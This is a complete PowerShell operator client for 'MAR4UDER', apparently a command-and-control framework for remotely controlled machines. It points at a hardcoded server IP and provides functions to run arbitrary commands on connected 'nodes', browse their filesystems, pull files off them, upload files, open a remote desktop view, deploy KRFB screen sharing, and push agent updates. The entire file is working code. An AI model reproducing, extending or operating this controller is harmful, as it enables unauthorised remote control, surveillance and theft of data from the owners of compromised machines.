# ==============================================================================
# MAR4UDER Windows Operator CLI (m4r.ps1)
# Interactive console & REST management for Windows
# ==============================================================================

param (
    [string]$Command = "console",
    [string]$Arg1 = "",
    [string]$Arg2 = "",
    [string]$Arg3 = ""
)

$ServerHost = if ($env:MAR4UDER_HOST) { $env:MAR4UDER_HOST } else { "104.143.206.163" }
$HttpPort   = if ($env:MAR4UDER_HTTP_PORT) { $env:MAR4UDER_HTTP_PORT } else { "8080" }
$NcPort     = if ($env:MAR4UDER_NC_PORT) { [int]$env:MAR4UDER_NC_PORT } else { 9000 }
$RfbPort    = if ($env:MAR4UDER_RFB_PORT) { [int]$env:MAR4UDER_RFB_PORT } else { 5900 }
$ApiUrl     = "http://$ServerHost`:$HttpPort/api/v1"

function Show-Help {
    Write-Host "`nMAR4UDER // Windows Operator CLI (m4r.ps1)" -ForegroundColor Cyan
    Write-Host "Target Server: $ServerHost (API: $HttpPort, Console: $NcPort)" -ForegroundColor DarkGray
    Write-Host "Usage:" -ForegroundColor Gray
    Write-Host "  .\m4r.ps1                          - Open interactive Netcat TUI Console" -ForegroundColor White
    Write-Host "  .\m4r.ps1 list                     - List all connected nodes & status" -ForegroundColor White
    Write-Host "  .\m4r.ps1 exec <node_id> <cmd>     - Execute isolated command directly" -ForegroundColor White
    Write-Host "  .\m4r.ps1 fs <node_id> [path]      - Explore filesystem on node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 get <node_id> <rem_path> - Download file from node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 put <node_id> <local>    - Upload file to node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 vnc <node_id>            - Open HTML5 Canvas Desktop in browser" -ForegroundColor White
    Write-Host "  .\m4r.ps1 krfb <node_id>           - Auto-install & deploy KRFB on node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 update <node_id>         - Upgrade node agent to newest binary" -ForegroundColor White
    Write-Host "  .\m4r.ps1 web                      - Open Web Dashboard in browser`n" -ForegroundColor White
}

function Start-TcpConsole {
    param(
        [string]$HostName,
        [int]$Port
    )
    Write-Host "[*] Connecting to MAR4UDER Console ($HostName`:$Port)..." -ForegroundColor Cyan
    Write-Host "[*] Type node number or ID to attach. Use 'help' inside console.`n" -ForegroundColor DarkGray

    # If nc or ncat exists in PATH, use it for optimal terminal rendering
    if (Get-Command ncat -ErrorAction SilentlyContinue) {
        ncat $HostName $Port
        return
    }
    if (Get-Command nc -ErrorAction SilentlyContinue) {
        nc $HostName $Port
        return
    }

    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.NoDelay = $true
        $client.Connect($HostName, $Port)
        $stream = $client.GetStream()
        $rawBytes = New-Object byte[] 4096
        
        $cancelSource = New-Object System.Threading.CancellationTokenSource
        $task = [System.Threading.Tasks.Task]::Run([Action]{
            try {
                while (-not $cancelSource.IsCancellationRequested -and $client.Connected) {
                    if ($stream.DataAvailable) {
                        $bytesRead = $stream.Read($rawBytes, 0, $rawBytes.Length)
                        if ($bytesRead -gt 0) {
                            $text = [System.Text.Encoding]::UTF8.GetString($rawBytes, 0, $bytesRead)
                            [Console]::Write($text)
                        } else {
                            break
                        }
                    } else {
                        [System.Threading.Thread]::Sleep(10)
                    }
                }
            } catch {}
        }, $cancelSource.Token)

        while ($client.Connected) {
            if ([Console]::KeyAvailable) {
                $key = [Console]::ReadKey($true)
                if ($key.Key -eq [ConsoleKey]::C -and ($key.Modifiers -band [ConsoleModifiers]::Control)) {
                    $sendBytes = [byte[]]@(3)
                    $stream.Write($sendBytes, 0, 1)
                    $stream.Flush()
                } elseif ($key.Key -eq [ConsoleKey]::Enter) {
                    $sendBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n")
                    $stream.Write($sendBytes, 0, $sendBytes.Length)
                    $stream.Flush()
                } elseif ($key.Key -eq [ConsoleKey]::Backspace) {
                    $sendBytes = [byte[]]@(8)
                    $stream.Write($sendBytes, 0, 1)
                    $stream.Flush()
                } elseif ($key.Key -eq [ConsoleKey]::Tab) {
                    $sendBytes = [byte[]]@(9)
                    $stream.Write($sendBytes, 0, 1)
                    $stream.Flush()
                } elseif ($key.Key -eq [ConsoleKey]::Escape) {
                    $sendBytes = [byte[]]@(27)
                    $stream.Write($sendBytes, 0, 1)
                    $stream.Flush()
                } else {
                    $char = $key.KeyChar
                    if ($char -ne 0) {
                        $sendBytes = [System.Text.Encoding]::UTF8.GetBytes($char.ToString())
                        $stream.Write($sendBytes, 0, $sendBytes.Length)
                        $stream.Flush()
                    }
                }
            } else {
                [System.Threading.Thread]::Sleep(10)
            }
        }

        $cancelSource.Cancel()
        $stream.Close()
        $client.Close()
        Write-Host "`n[*] Disconnected." -ForegroundColor Yellow
    } catch {
        Write-Host "`n[-] Connection error: $_" -ForegroundColor Red
    }
}

# If first arg is a node ID or number, execute default command or route
switch ($Command.ToLower()) {
    "console" {
        Start-TcpConsole -HostName $ServerHost -Port $NcPort
    }

    "list" {
        Write-Host "[*] Fetching registered nodes from $ApiUrl/nodes ..." -ForegroundColor Cyan
        try {
            $resp = Invoke-RestMethod -Uri "$ApiUrl/nodes" -Method Get
            if ($resp.Count -eq 0) {
                Write-Host "[-] No nodes currently registered." -ForegroundColor Yellow
            } else {
                $resp | Select-Object slot, id, is_online, hostname, remote_addr, vnc_engine, vnc_port, note | Format-Table -AutoSize
            }
        } catch {
            Write-Host "[-] Error querying API: $_" -ForegroundColor Red
        }
    }

    "exec" {
        if (-not $Arg1 -or -not $Arg2) {
            Write-Host "[-] Usage: .\m4r.ps1 exec <node_id> <command>" -ForegroundColor Red
            return
        }
        $body = @{ command = $Arg2 } | ConvertTo-Json
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/cmd" -Method Post -Body $body -ContentType "application/json"
            if ($res.output) {
                Write-Host $res.output
            } else {
                Write-Host ($res | ConvertTo-Json -Depth 3)
            }
        } catch {
            Write-Host "[-] Exec failed: $_" -ForegroundColor Red
        }
    }

    "fs" {
        if (-not $Arg1) {
            Write-Host "[-] Usage: .\m4r.ps1 fs <node_id> [path]" -ForegroundColor Red
            return
        }
        $path = if ($Arg2) { $Arg2 } else { "/" }
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/fs?path=$path" -Method Get
            Write-Host "`nListing: $($res.current_path)" -ForegroundColor Cyan
            $res.entries | Select-Object perm, is_dir, size, name | Format-Table -AutoSize
        } catch {
            Write-Host "[-] FS listing failed: $_" -ForegroundColor Red
        }
    }

    "get" {
        if (-not $Arg1 -or -not $Arg2) {
            Write-Host "[-] Usage: .\m4r.ps1 get <node_id> <remote_path> [local_dest]" -ForegroundColor Red
            return
        }
        $localPath = if ($Arg3) { $Arg3 } else { Split-Path $Arg2 -Leaf }
        Write-Host "[*] Requesting download: $Arg2 from $Arg1..." -ForegroundColor Cyan
        try {
            $body = @{ remote_path = $Arg2 } | ConvertTo-Json
            $dlReq = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/download" -Method Post -Body $body -ContentType "application/json"
            if ($dlReq.file_id) {
                Invoke-WebRequest -Uri "$ApiUrl/files/$($dlReq.file_id)" -OutFile $localPath
                Write-Host "[+] Saved to $localPath" -ForegroundColor Green
            } else {
                Write-Host "[-] Failed to fetch file: $($dlReq | ConvertTo-Json)" -ForegroundColor Red
            }
        } catch {
            Write-Host "[-] Download error: $_" -ForegroundColor Red
        }
    }

    "put" {
        if (-not $Arg1 -or -not $Arg2) {
            Write-Host "[-] Usage: .\m4r.ps1 put <node_id> <local_file> [remote_dest]" -ForegroundColor Red
            return
        }
        if (-not (Test-Path $Arg2)) {
            Write-Host "[-] Local file not found: $Arg2" -ForegroundColor Red
            return
        }
        $remPath = if ($Arg3) { $Arg3 } else { "/tmp/" + (Split-Path $Arg2 -Leaf) }
        Write-Host "[*] Uploading $Arg2 -> $Arg1`:$remPath ..." -ForegroundColor Cyan
        try {
            $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $Arg2))
            $b64 = [Convert]::ToBase64String($bytes)
            $body = @{
                path = $remPath
                data = $b64
            } | ConvertTo-Json
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/receive_file" -Method Post -Body $body -ContentType "application/json"
            Write-Host "[+] Upload status: $($res.status)" -ForegroundColor Green
        } catch {
            Write-Host "[-] Upload error: $_" -ForegroundColor Red
        }
    }

    "vnc" {
        $url = "http://$ServerHost`:$HttpPort/"
        Write-Host "[+] Opening HTML5 Web Desktop: $url" -ForegroundColor Green
        Start-Process $url
    }

    "krfb" {
        if (-not $Arg1) {
            Write-Host "[-] Usage: .\m4r.ps1 krfb <node_id>" -ForegroundColor Red
            return
        }
        $body = @{ vnc_engine = "krfb" } | ConvertTo-Json
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/settings" -Method Post -Body $body -ContentType "application/json"
            Write-Host "[+] KRFB engine deployment requested for $Arg1" -ForegroundColor Green
        } catch {
            Write-Host "[-] Error: $_" -ForegroundColor Red
        }
    }

    "update" {
        if (-not $Arg1) {
            Write-Host "[-] Usage: .\m4r.ps1 update <node_id>" -ForegroundColor Red
            return
        }
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/update" -Method Post
            Write-Host "[+] Update dispatched to node $Arg1" -ForegroundColor Green
        } catch {
            Write-Host "[-] Error: $_" -ForegroundColor Red
        }
    }

    "web" {
        $url = "http://$ServerHost`:$HttpPort/"
        Start-Process $url
    }

    default {
        # Check if first argument is a numeric slot or node ID
        if ($Command -match '^\d+$' -or $Command -match '^mos-') {
            Write-Host "[*] Target node: $Command" -ForegroundColor Cyan
            # Launch console and auto-route
            Start-TcpConsole -HostName $ServerHost -Port $NcPort
        } else {
            Show-Help
        }
    }
}
